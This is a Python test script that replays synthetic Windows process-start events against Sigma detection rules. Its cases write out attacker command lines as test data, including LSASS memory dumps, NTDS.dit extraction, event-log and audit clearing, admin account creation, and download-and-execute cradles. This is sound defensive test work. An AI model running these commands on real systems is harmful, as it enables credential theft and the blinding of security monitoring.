"""Check Windows process-creation rule logic with the real engine, without sensors.

Each case is a synthetic process-start event with the fields the Windows ETW
provider populates. The cases cover the positive spellings every corrected rule
must catch and the near-misses it must not.
"""

import argparse
import hashlib
import json
import shutil
import subprocess
import tempfile
from pathlib import Path

PROCDUMP = "LSASS Memory Dump via Procdump"
COMSVCS = "LSASS Memory Dump via comsvcs.dll MiniDump"
EVENTLOG = "Windows Event Log Cleared via Command Line"
IFM = "Active Directory Database (NTDS.dit) Extraction via ntdsutil IFM"
NTDS_COPY = "NTDS.dit Copied or Accessed with a File Tool"
ENCODED = "Suspicious Encoded PowerShell Command Line"
BITS = "BITS Job Download via bitsadmin"
WMIC = "WMI Process Execution via WMIC"
LOCALADMIN = "Local Account Created or Added to Administrators"
LOGGING_DISABLED = "Windows Event Channel or ETW Session Stopped from the Command Line"
AUDIT_DISABLED = "Windows Audit Policy Cleared or Disabled from the Command Line"
WRONG_PATH = "Windows System Process Name Executed from an Unexpected Path"
MINER = "Cryptominer Command Line (Windows)"
DOWNLOADED_SCRIPT = "Script Host Running a Downloaded or Archive-Extracted Script"
DOTNET_BUILD = ".NET Build or Registration Tool Using a User-Writable Path"
WMI_WINRM = "WMI or WinRM Provider Spawning a Shell or Script Host"
PSEXEC = "PsExec or Renamed PsExec Execution"
CLICKFIX = "Explorer Spawning an Interpreter With a ClickFix-Style Command Line"

RULE_FILES = [
    "proc_creation_win_susp_procdump_lsass.yml",
    "proc_creation_win_susp_lsass_comsvcs_minidump.yml",
    "proc_creation_win_susp_eventlog_clear.yml",
    "proc_creation_win_susp_ntds_dit_extraction.yml",
    "proc_creation_win_susp_ntds_dit_copy.yml",
    "proc_creation_win_susp_encoded_powershell.yml",
    "proc_creation_win_susp_bitsadmin_download.yml",
    "proc_creation_win_susp_wmic_process_create.yml",
    "proc_creation_win_susp_local_admin_account_added.yml",
    "proc_creation_win_susp_logging_disabled.yml",
    "proc_creation_win_susp_audit_policy_disabled.yml",
    "proc_creation_win_susp_system_binary_wrong_path.yml",
    "proc_creation_win_cryptominer_cmdline.yml",
    "proc_creation_win_susp_script_host_downloaded_script.yml",
    "proc_creation_win_susp_dotnet_build_tool_user_writable.yml",
    "proc_creation_win_susp_wmi_winrm_spawning_shell.yml",
    "proc_creation_win_susp_psexec_execution.yml",
    "proc_creation_win_susp_explorer_clickfix_command.yml",
]

SYS = "C:\\Windows\\System32\\"
PS = SYS + "WindowsPowerShell\\v1.0\\powershell.exe"
WMI = SYS + "wbem\\WmiPrvSE.exe"
WINRM = SYS + "wsmprovhost.exe"
EXPLORER = r"C:\Windows\explorer.exe"
VS = "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\"
DEVENV = VS + "Common7\\IDE\\devenv.exe"
MSBUILD = VS + "MSBuild\\Current\\Bin\\amd64\\MSBuild.exe"
DOTNET = r"C:\Program Files\dotnet\dotnet.exe"
WPF_TEMP = r'MSBuild.exe /nologo "C:\Users\Alice\AppData\Local\Temp\App_a1b2c3d4_wpftmp.csproj"'

# (image, command line, original file name or None, rule title that must alert or None)
CASES = [
    # Procdump: tool + LSASS target + dump flag.
    (r"C:\tools\procdump.exe", "procdump.exe -accepteula -ma lsass.exe lsass.dmp", None, PROCDUMP),
    (r"C:\tools\procdump64.exe", "procdump64.exe -mm lsass C:\\x.dmp", None, PROCDUMP),
    (r"C:\tools\procdump.exe", 'procdump.exe /ma "lsass.exe" x.dmp', None, PROCDUMP),
    (r"C:\temp\svc.exe", "svc.exe -ma lsass.exe x.dmp", "procdump", PROCDUMP),  # renamed binary
    (r"C:\tools\procdump.exe", "procdump.exe -ma notepad.exe notepad.dmp", None, None),
    (r"C:\tools\procdump.exe", "procdump.exe -ma notepad.exe lsass_notes.dmp", None, None),
    (r"C:\tools\procdump.exe", "procdump.exe -accepteula lsass.exe", None, None),  # no dump flag
    (r"C:\temp\svc.exe", "svc.exe -ma lsass.exe x.dmp", None, None),  # no tool identity
    # comsvcs: rundll32 + comsvcs.dll + adjacent export.
    (
        SYS + "rundll32.exe",
        r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 x.dmp full",
        None,
        COMSVCS,
    ),
    (SYS + "rundll32.exe", r"rundll32.exe comsvcs.dll,#24 624 x.dmp full", None, COMSVCS),
    (SYS + "rundll32.exe", r"rundll32.exe comsvcs.dll, #+000024 624 x.dmp full", None, COMSVCS),
    (SYS + "rundll32.exe", r"rundll32.exe comsvcs.dll #-4294967272 624 x.dmp full", None, COMSVCS),
    (r"C:\temp\r.exe", r"r.exe comsvcs.dll, MiniDump 624 x.dmp full", "RUNDLL32.EXE", COMSVCS),
    (SYS + "rundll32.exe", r"rundll32.exe comsvcs.dll, #240 624 x.dmp full", None, None),
    (SYS + "rundll32.exe", r"rundll32.exe comsvcs.dll, #124 624 x.dmp full", None, None),
    (SYS + "rundll32.exe", r"rundll32.exe shell32.dll,Control_RunDLL minidump comsvcs", None, None),
    (SYS + "notepad.exe", r"notepad.exe comsvcs.dll, MiniDump", None, None),  # not rundll32
    # Event log clear: per-branch process identity.
    (SYS + "wevtutil.exe", "wevtutil.exe cl Security", None, EVENTLOG),
    (SYS + "wevtutil.exe", "wevtutil.exe clear-log System", None, EVENTLOG),
    (PS, 'powershell.exe -Command "Clear-EventLog -LogName Application"', None, EVENTLOG),
    (r"C:\Program Files\PowerShell\7\pwsh.exe", 'pwsh.exe -c "$l.ClearEventLog()"', None, EVENTLOG),
    (
        r"C:\Program Files\PowerShell\7\pwsh.exe",
        'pwsh.exe -c "Get-EventLog -LogName Security -Newest 5"',
        None,
        None,
    ),
    (SYS + "wevtutil.exe", "wevtutil.exe qe Security /c:5", None, None),
    (SYS + "wevtutil.exe", "wevtutil.exe epl Security C:\\cl\\sec.evtx", None, None),
    (SYS + "cmd.exe", "cmd.exe /c echo Clear-EventLog", None, None),  # not a PowerShell host
    (SYS + "findstr.exe", "findstr.exe Clear-EventLog script.ps1", None, None),
    # NTDS IFM (ntdsutil) vs copy/access (separate rule).
    (SYS + "ntdsutil.exe", 'ntdsutil.exe "ac i ntds" "ifm" "create full C:\\ifm" q q', None, IFM),
    (SYS + "ntdsutil.exe", "ntdsutil.exe ifm create sysvol full C:\\ifm", None, IFM),
    (SYS + "ntdsutil.exe", 'ntdsutil.exe "ac i ntds" "files" info q q', None, None),
    (SYS + "ntdsutil.exe", 'ntdsutil.exe "ac i ntds" q q', None, None),
    (SYS + "cmd.exe", "cmd.exe /c echo ifm create full", None, None),
    (
        SYS + "esentutl.exe",
        r"esentutl.exe /y /vss C:\Windows\NTDS\ntds.dit /d C:\x\ntds.dit",
        None,
        NTDS_COPY,
    ),
    (
        SYS + "cmd.exe",
        r"cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\NTDS\ntds.dit C:\x",
        None,
        NTDS_COPY,
    ),
    (PS, r"powershell.exe -c Copy-Item C:\Windows\NTDS\ntds.dit C:\x", None, NTDS_COPY),
    (SYS + "robocopy.exe", r"robocopy.exe C:\vss\Windows\NTDS C:\x ntds.dit", None, NTDS_COPY),
    (SYS + "cmd.exe", "cmd.exe /c echo ntds.dit", None, None),
    (SYS + "findstr.exe", "findstr.exe ntds.dit notes.txt", None, None),
    (
        SYS + "esentutl.exe",
        r"esentutl.exe /mh C:\Windows\NTDS\ntds.dit",
        None,
        None,
    ),  # header dump, no copy
    (SYS + "esentutl.exe", r"esentutl.exe /y C:\a.edb /d C:\b.edb", None, None),
    # Encoded PowerShell: whole-argument boundaries only.
    (PS, "powershell.exe -NoProfile -EncodedCommand VwByAGkAdABlAA==", None, ENCODED),
    (PS, "powershell.exe -enc VwByAGkAdABlAA==", None, ENCODED),
    (PS, "powershell.exe -e VwByAGkAdABlAA==", None, ENCODED),
    (PS, "powershell.exe -ec VwByAGkAdABlAA==", None, ENCODED),
    (PS, "powershell.exe -encodedcomman VwByAGkAdABlAA==", None, ENCODED),
    (PS, "powershell.exe /EncodedCommand VwByAGkAdABlAA==", None, ENCODED),
    (PS, "powershell.exe \u2013enc VwByAGkAdABlAA==", None, ENCODED),
    (PS, 'powershell.exe -nop -w hidden -ENC "VwByAGkAdABlAA=="', None, ENCODED),
    (r"C:\Program Files\PowerShell\7\pwsh.exe", "pwsh.exe -en VwByAGkAdABlAA==", None, ENCODED),
    (r"C:\temp\ps.exe", "ps.exe -enc VwByAGkAdABlAA==", "PowerShell.EXE", ENCODED),
    (PS, 'powershell.exe -Command "Get-Content a.txt -Encoding UTF8"', None, None),
    (PS, "powershell.exe -ExecutionPolicy Bypass -File run.ps1", None, None),
    (PS, "powershell.exe -encoding UTF8 -Command dir", None, None),
    (PS, "powershell.exe -encx VwByAGkAdABlAA==", None, None),
    (PS, "powershell.exe -ep Bypass -Command dir", None, None),
    (PS, "powershell.exe -Command dir -e-nc", None, None),
    (SYS + "cmd.exe", "cmd.exe /c echo -enc VwByAGkAdABlAA==", None, None),
    # BITS: remote-source direct transfer, not job management.
    (
        SYS + "bitsadmin.exe",
        "bitsadmin.exe /transfer job1 http://example.test/a.exe C:\\a.exe",
        None,
        BITS,
    ),
    (
        SYS + "bitsadmin.exe",
        "bitsadmin /transfer job1 /download /priority high https://example.test/a C:\\a",
        None,
        BITS,
    ),
    (SYS + "bitsadmin.exe", "bitsadmin /addfile job1 ftp://example.test/a C:\\a", None, BITS),
    (r"C:\temp\b.exe", "b.exe -transfer j http://example.test/a C:\\a", "bitsadmin.exe", BITS),
    (SYS + "bitsadmin.exe", "bitsadmin.exe /create httpjob", None, None),
    (SYS + "bitsadmin.exe", "bitsadmin.exe /create /download job1", None, None),
    (SYS + "bitsadmin.exe", "bitsadmin.exe /list /allusers", None, None),
    (SYS + "bitsadmin.exe", "bitsadmin.exe /resume job1", None, None),
    (SYS + "bitsadmin.exe", "bitsadmin.exe /transfer job1 C:\\src.bin C:\\dst.bin", None, None),
    (SYS + "bitsadmin.exe", "bitsadmin.exe /addfile job1 C:\\httpdocs\\a C:\\b", None, None),
    (
        SYS + "cmd.exe",
        "cmd.exe /c echo bitsadmin /transfer j http://example.test/a C:\\a",
        None,
        None,
    ),
    # WMIC: ordered process / call / create.
    (SYS + "wbem\\WMIC.exe", 'wmic.exe process call create "cmd.exe /c calc"', None, WMIC),
    (SYS + "wbem\\WMIC.exe", 'wmic.exe /node:srv01 process call create "cmd.exe"', None, WMIC),
    (SYS + "wbem\\WMIC.exe", "wmic.exe PROCESS CALL CREATE notepad", None, WMIC),
    (r"C:\temp\w.exe", "w.exe process call create calc", "wmic.exe", WMIC),
    (SYS + "wbem\\WMIC.exe", "wmic.exe process list brief", None, None),
    (SYS + "wbem\\WMIC.exe", "wmic.exe process where name=cmd.exe get processid", None, None),
    (SYS + "wbem\\WMIC.exe", "wmic.exe service call create", None, None),
    (SYS + "wbem\\WMIC.exe", "wmic.exe create call process", None, None),
    (SYS + "cmd.exe", "cmd.exe /c echo process call create", None, None),
    # Local accounts: `user` is the net subcommand; a group name containing it is not.
    (SYS + "net.exe", "net.exe user bob P@ssw0rd! /add", None, LOCALADMIN),
    (SYS + "net1.exe", "net1 user /add bob", None, LOCALADMIN),
    (SYS + "net.exe", 'net.exe localgroup "Administrators" bob /add', None, LOCALADMIN),
    (SYS + "net.exe", 'net.exe localgroup "Remote Desktop Users" bob /add', None, None),
    (SYS + "net.exe", "net.exe localgroup Users bob /add", None, None),
    (SYS + "net.exe", "net.exe user bob", None, None),
    (SYS + "net.exe", "net.exe user bob /delete", None, None),
    (SYS + "cmd.exe", "cmd.exe /c echo net user bob /add", None, None),
    # Logging blinding: actual verbs and options for each tool.
    (SYS + "wevtutil.exe", "wevtutil.exe sl Defender/Operational /e:false", None, LOGGING_DISABLED),
    (
        r"C:\Tools\evt.exe",
        r'"C:\Tools\evt.exe" "SET-LOG" "Some Channel" "/E:FALSE"',
        "wevtutil.exe",
        LOGGING_DISABLED,
    ),
    (SYS + "logman.exe", 'logman.exe stop "Trace Session" -ets', None, LOGGING_DISABLED),
    (SYS + "wevtutil.exe", "wevtutil.exe sl Application /e:falsex", None, None),
    (SYS + "logman.exe", "logman.exe start stop -ets", None, None),
    (SYS + "logman.exe", "logman.exe stop trace -ets2", None, None),
    # Audit policy: clear, remove, and independently disabling either outcome.
    (SYS + "auditpol.exe", "auditpol.exe /clear /y", None, AUDIT_DISABLED),
    (SYS + "auditpol.exe", "auditpol.exe -remove /allusers", None, AUDIT_DISABLED),
    (
        SYS + "auditpol.exe",
        'auditpol.exe /SET /subcategory:"Process Creation" "/success:disable"',
        None,
        AUDIT_DISABLED,
    ),
    (
        r"C:\Tools\audit.exe",
        "audit.exe \u2013set /category:* /failure:disable",
        "auditpol.exe",
        AUDIT_DISABLED,
    ),
    (SYS + "auditpol.exe", "auditpol.exe /set /category:* /failure:disablex", None, None),
    # The trusted path must be rooted and refer to a direct child.
    (r"C:\Users\Public\svchost.exe", "svchost.exe", None, WRONG_PATH),
    (r"C:\Temp\Windows\System32\lsass.exe", "lsass.exe", None, WRONG_PATH),
    (r"C:\Windows\System32\Tasks\winlogon.exe", "winlogon.exe", None, WRONG_PATH),
    (r"C:\Windows\System32\csrss.exe", "csrss.exe", None, None),
    # Miner indicators work without relying on a specific process image name.
    (r"C:\Tools\worker.exe", "worker.exe -o stratum+tcp://pool.invalid:3333", None, MINER),
    (r"C:\Tools\worker.exe", "worker.exe -o stratum+ssl://pool.invalid:443", None, MINER),
    (r"C:\Tools\worker.exe", "worker.exe --donate-level=5", None, MINER),
    (r"C:\Tools\worker.exe", 'worker.exe "--coin=monero"', None, MINER),
    (r"C:\Tools\worker.exe", "worker.exe --coin-count=5", None, None),
    # Script delivery: run a whole file argument from a download or extraction path.
    (
        SYS + "wscript.exe",
        r'wscript.exe //nologo "C:\Users\Alice\Downloads\April Report.js"',
        None,
        DOWNLOADED_SCRIPT,
    ),
    (
        SYS + "cscript.exe",
        r'cscript.exe "D:\Users\Alice\AppData\Local\Temp\fixture.JSE" //nologo',
        None,
        DOWNLOADED_SCRIPT,
    ),
    (SYS + "cscript.exe", r"cscript.exe C:\Temp\Rar$DI7000\fixture.vbs", None, DOWNLOADED_SCRIPT),
    (SYS + "wscript.exe", r"wscript.exe C:\Temp\7zO61\folder\fixture.vbe", None, DOWNLOADED_SCRIPT),
    (
        SYS + "mshta.exe",
        r'mshta.exe "C:\Inbox\April Report.zip\folder\fixture.hta"',
        None,
        DOWNLOADED_SCRIPT,
    ),
    (
        r"C:\Tools\fixture.exe",
        r'"C:\Tools\fixture.exe" C:\Users\Alice\Downloads\fixture.wsf',
        "WSCRIPT.EXE",
        DOWNLOADED_SCRIPT,
    ),
    (SYS + "cmd.exe", r"cmd.exe /c echo C:\Users\Alice\Downloads\fixture.js", None, None),
    (SYS + "wscript.exe", r"wscript.exe C:\Users\Alice\Downloads-old\fixture.js", None, None),
    (SYS + "wscript.exe", r"wscript.exe C:\Users\Alice\Downloads\fixture.js.txt", None, None),
    (SYS + "wscript.exe", r'wscript.exe "C:\Inbox\April.zip.bak\fixture.js"', None, None),
    (
        SYS + "wscript.exe",
        r'wscript.exe "C:\Users\Alice\Downloads\read me.txt" C:\Admin\fixture.js',
        None,
        None,
    ),
    (
        SYS + "wscript.exe",
        r'wscript.exe "C:\Users\Alice\Downloads\fixture.js extra.txt"',
        None,
        None,
    ),
    # Managed proxy tools: each writable root, both identity fields, and complete arguments.
    (r"C:\Users\Alice\MSBuild.exe", "MSBuild.exe /version", None, DOTNET_BUILD),
    (r"E:\Temp\fixture.exe", "fixture.exe /?", "regsvcs.exe", DOTNET_BUILD),
    (MSBUILD, r'MSBuild.exe "C:\ProgramData\Atomic Project\fixture.proj"', None, DOTNET_BUILD),
    (MSBUILD, r"MSBuild.exe D:\Users\Alice\project.xml", None, DOTNET_BUILD),
    (
        SYS + "InstallUtil.exe",
        r"InstallUtil.exe C:\Windows\Temp\fixture.dll /?",
        None,
        DOTNET_BUILD,
    ),
    (SYS + "RegAsm.exe", r"RegAsm.exe E:\PerfLogs\fixture.dll", None, DOTNET_BUILD),
    (
        r"C:\Tools\fixture.exe",
        r'fixture.exe -p:ExtraImports="C:\Temp\fixture.targets"',
        "MSBuild.exe",
        DOTNET_BUILD,
    ),
    (MSBUILD, r"MSBuild.exe C:\Admin\Users\fixture.csproj", None, None),
    (MSBUILD, r"MSBuild.exe C:\Users\Alice\fixture.dll.txt", None, None),
    (MSBUILD, r'MSBuild.exe -p:Message="Build C:\Users\Alice\fixture.dll later"', None, None),
    (SYS + "regsvr32.exe", r"regsvr32.exe C:\Windows\Temp\fixture.dll", None, None),
    # PsExec: independent identities and token-bounded combinations.
    (r"C:\Tools\fixture.exe", "fixture.exe /?", "PsExec.c", PSEXEC),
    (r"C:\Tools\fixture.exe", "fixture.exe /?", "PSEXEC.EXE", PSEXEC),
    (SYS + "PSEXESVC.exe", "PSEXESVC.exe", None, PSEXEC),
    (r"C:\Tools\fixture.exe", "fixture.exe -accepteula -s", None, PSEXEC),
    (r"C:\Tools\fixture.exe", 'fixture.exe "-I" 2 "-ACCEPTEULA"', None, PSEXEC),
    (r"C:\Tools\fixture.exe", r'fixture.exe "\\fixture.example.invalid" -accepteula', None, PSEXEC),
    (r"C:\Tools\fixture.exe", r"fixture.exe -accepteula \\192.0.2.10", None, PSEXEC),
    (r"C:\Tools\fixture.exe", "fixture.exe -accepteula -silent", None, None),
    (r"C:\Tools\fixture.exe", "fixture.exe -accepteula2 -s", None, None),
    (r"C:\Tools\fixture.exe", "fixture.exe -s", None, None),
    (r"C:\Tools\fixture.exe", r'fixture.exe -accepteula "\\test-server\share"', None, None),
    (SYS + "notpsexesvc.exe", "notpsexesvc.exe", "notpsexec.c", None),
]

# The last field overrides ParentImage. Tuples of titles specify overlapping alerts.
PARENT_CASES = [
    # The MSBuild exception needs the actual installed images and the entire invocation.
    (MSBUILD, WPF_TEMP, None, None, DEVENV),
    (MSBUILD, WPF_TEMP, None, None, DOTNET),
    (MSBUILD, WPF_TEMP, None, DOTNET_BUILD, r"C:\Temp\tools\devenv.exe"),
    (MSBUILD, WPF_TEMP, None, DOTNET_BUILD, r"C:\Temp\Program Files\dotnet\dotnet.exe"),
    (r"C:\Temp\MSBuild.exe", WPF_TEMP, None, DOTNET_BUILD, DEVENV),
    ("C:\\Temp\\" + MSBUILD[3:], WPF_TEMP, None, DOTNET_BUILD, DEVENV),
    (MSBUILD, WPF_TEMP + r" C:\Temp\extra.proj", None, DOTNET_BUILD, DEVENV),
    (MSBUILD, WPF_TEMP.replace(r"\Temp\App_", r"\Temp\..\App_"), None, DOTNET_BUILD, DEVENV),
    (MSBUILD, r"MSBuild.exe C:\Users\Alice\src\fixture.csproj", None, DOTNET_BUILD, DEVENV),
    # Both provider names and all supported child images.
    (SYS + "cmd.exe", "cmd.exe /c echo fixture", None, WMI_WINRM, WMI),
    (PS, "powershell.exe -NoProfile", None, WMI_WINRM, WINRM),
    (r"C:\Program Files\PowerShell\7\pwsh.exe", "pwsh.exe -NoProfile", None, WMI_WINRM, WMI),
    (SYS + "mshta.exe", "mshta.exe C:\\Admin\\fixture.hta", None, WMI_WINRM, WINRM),
    (SYS + "cscript.exe", "cscript.exe C:\\Admin\\fixture.vbs", None, WMI_WINRM, WMI),
    (SYS + "wscript.exe", "wscript.exe C:\\Admin\\fixture.js", None, WMI_WINRM, WINRM),
    (SYS + "whoami.exe", "whoami.exe", None, None, WMI),
    (SYS + "cmd.exe", "cmd.exe /c echo fixture", None, None, SYS + "wbem\\MyWmiPrvSE.exe"),
    (SYS + "cmd.exe", "cmd.exe /c echo fixture", None, None, WINRM + ".old"),
    # Explorer must be the direct parent. Encoding, evaluators and cradles have token boundaries.
    (SYS + "mshta.exe", "mshta.exe http://example.invalid/fixture.hta", None, CLICKFIX, EXPLORER),
    (
        PS,
        "powershell.exe -eNc ZgBpAHgAdAB1AHIAZQA=",
        None,
        (ENCODED, CLICKFIX),
        EXPLORER,
    ),
    (
        r"C:\Program Files\PowerShell\7\pwsh.exe",
        "pwsh.exe -EncodedCommand ZgBpAHgAdAB1AHIAZQA=",
        None,
        (ENCODED, CLICKFIX),
        EXPLORER,
    ),
    (PS, 'powershell.exe -Command "iex $fixture"', None, CLICKFIX, EXPLORER),
    (PS, 'powershell.exe -Command "Invoke-Expression $fixture"', None, CLICKFIX, EXPLORER),
    (PS, 'powershell.exe -Command "irm $fixture | pwsh"', None, CLICKFIX, EXPLORER),
    (SYS + "cmd.exe", 'cmd.exe /c "curl.exe %FIXTURE% | powershell.exe"', None, CLICKFIX, EXPLORER),
    (SYS + "wscript.exe", "wscript.exe https://example.invalid/test.js", None, CLICKFIX, EXPLORER),
    (SYS + "cscript.exe", "cscript.exe https://example.invalid/test.js", None, CLICKFIX, EXPLORER),
    (PS, "powershell.exe -Command Get-Content fixture -Encoding utf8", None, None, EXPLORER),
    (PS, 'powershell.exe -Command "Get-ChildItem prefixiex"', None, None, EXPLORER),
    (PS, 'powershell.exe -Command "Get-ChildItem Invoke-ExpressionFile"', None, None, EXPLORER),
    (PS, 'powershell.exe -Command "irm $fixture | Format-List"', None, None, EXPLORER),
    (SYS + "mshta.exe", "mshta.exe C:\\Admin\\fixture.hta", None, None, EXPLORER),
    (r"C:\Tools\browser.exe", "browser.exe https://example.invalid/", None, None, EXPLORER),
    (SYS + "mshta.exe", "mshta.exe https://example.invalid/test.hta", None, None, SYS + "cmd.exe"),
    (
        PS,
        "powershell.exe -Enc ZgBpAHgAdAB1AHIAZQA=",
        None,
        ENCODED,
        r"C:\Windows\FileExplorer.exe",
    ),
]


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--engine", required=True, type=Path)
    args = parser.parse_args()
    engine = args.engine.resolve()
    repo = Path(__file__).resolve().parents[2]
    timestamp = "2026-10-08T08:00:00Z"
    events = []
    expected = set()
    cases = [(*case, SYS + "cmd.exe") for case in CASES] + PARENT_CASES
    for index, (image, command_line, original, titles, parent_image) in enumerate(cases, 1):
        fields = {
            "ProcessId": str(index),
            "Image": image,
            "CommandLine": command_line,
            "ParentImage": parent_image,
        }
        if original is not None:
            fields["OriginalFileName"] = original
        events.append(
            {
                "event_time": timestamp,
                "ingest_seq": index,
                "platform": "windows",
                "provider": "etw",
                "category": "Process",
                "event_id": 1,
                "opcode": 1,
                "fields": fields,
            }
        )
        if isinstance(titles, str):
            titles = (titles,)
        expected.update((index, title) for title in titles or ())

    with tempfile.TemporaryDirectory(prefix="rustinel-windows-process-replay-") as directory:
        root = Path(directory)
        rules = root / "sigma"
        rules.mkdir()
        for name in RULE_FILES:
            shutil.copyfile(repo / "rules/sigma/windows" / name, rules / name)
        payload = root / "cases.ndjson"
        data = "".join(json.dumps(event) + "\n" for event in events).encode()
        payload.write_bytes(data)
        payload.with_suffix(".manifest.json").write_text(
            json.dumps(
                {
                    "schema_version": 2,
                    "payload": payload.name,
                    "rustinel_version": json.loads(
                        (repo / "compatibility/engine.json").read_text()
                    )["version"],
                    "platform": "windows",
                    "started_at": timestamp,
                    "ended_at": timestamp,
                    "status": "complete",
                    "events": {
                        "received": len(events),
                        "written": len(events),
                        "lost": 0,
                        "source_lost": 0,
                    },
                    "payload_bytes": len(data),
                    "payload_sha256": hashlib.sha256(data).hexdigest(),
                }
            )
        )
        config = root / "config.toml"
        config.write_text(
            f"[scanner]\nsigma_rules_path = {json.dumps(str(rules))}\n"
            'sigma_match_mode = "all"\nyara_enabled = false\n'
            "[ioc]\nenabled = false\n[dedup]\nenabled = false\n"
            f"[logging]\ndirectory = {json.dumps(str(root / 'logs'))}\n"
            f"[alerts]\ndirectory = {json.dumps(str(root / 'logs'))}\n"
        )
        output = root / "alerts.ndjson"
        subprocess.run(
            [str(engine), "replay", str(payload), "--config", str(config), "--output", str(output)],
            check=True,
            timeout=60,
        )
        alerts = [json.loads(line) for line in output.read_text().splitlines()]
        actual = {(alert["process.pid"], alert["rule.name"]) for alert in alerts}
        if actual != expected or len(alerts) != len(expected):
            missing = sorted((i, t, cases[i - 1][1]) for i, t in expected - actual)
            unexpected = sorted((i, t, cases[i - 1][1]) for i, t in actual - expected)
            raise RuntimeError(f"Missing alerts: {missing}; unexpected alerts: {unexpected}")
        print(
            f"Passed {len(cases)} Windows process replay cases ({len(expected)} expected alerts)."
        )


if __name__ == "__main__":
    main()
